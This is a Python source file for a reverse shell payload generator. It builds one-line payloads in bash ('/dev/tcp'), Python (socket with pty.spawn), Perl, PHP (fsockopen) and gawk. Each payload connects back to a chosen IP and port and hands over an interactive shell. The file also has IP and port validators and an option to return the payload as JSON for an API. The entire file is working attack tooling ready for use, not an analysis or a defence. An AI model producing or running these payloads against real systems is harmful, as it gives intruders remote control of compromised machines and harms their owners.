import ipaddress

# Validate IP Addr.
def valid_ip(address):
    try: 
        print(ipaddress.ip_address(address))
        return True
    except:
        return False

# Validate Port.
def valid_port(port):
	if isinstance(port, int) and port <= 65535:
		return True

# Return full shell path.
def get_shell_path(shell):
	if shell in ["bash", "sh", "csh", "ksh", "zsh"]:
		return "/bin/" + shell
	return "/bin/sh"

# Python Payload
def get_python_payload(ip, port, shell):
	return (
		 'socket=__import__("socket");'
		 'os=__import__("os");'
		 'pty=__import__("pty");'
		 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
		f's.connect(("{ip}",{port}));'
		 'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
		f'pty.spawn("{shell}")'
	)

# Perl Payload
def get_perl_payload(ip, port, shell):
	return (
		f"use Socket;$i=\"{ip}\";$p={port};"
		 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
		 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
		 'open(STDOUT,">&S");open(STDERR,">&S");'
		f'exec("{shell}")'
		 ';};'
	)

# Awk Payload
def get_awk_payload(ip, port, shell):
	return (
		 'BEGIN {s ='
		f'"/inet/tcp/0/{ip}/{port}";'
		 'while(42) {'
		 ' do{ printf "awkshell> " |& s;'
		 ' s |& getline c;'
		 ' if(c){ while ((c |& getline) > 0) print $0 |& s;'
		 ' close(c); } } while(c != "exit") close(s); }}'
	)

# Generate payloads.
def payload_generator(ip, port, lang, quotes_pref, shell_pref, api):
	# Full shell path.
	shell = get_shell_path(shell_pref)

	if lang == "bash":
		payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
	elif lang == "python":
		payload = get_python_payload(ip, port, shell)
	elif lang == "perl":
		payload = get_perl_payload(ip, port, shell)
	elif lang == "php":
		payload = f'$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");'
	elif lang == "awk":
		payload = get_awk_payload(ip, port, shell)
	else:
		payload = ""

	if api:
		return { 'payload' : payload }
	if quotes_pref == "y":
		return f"'{payload}'\n"
	return f"{payload}\n"

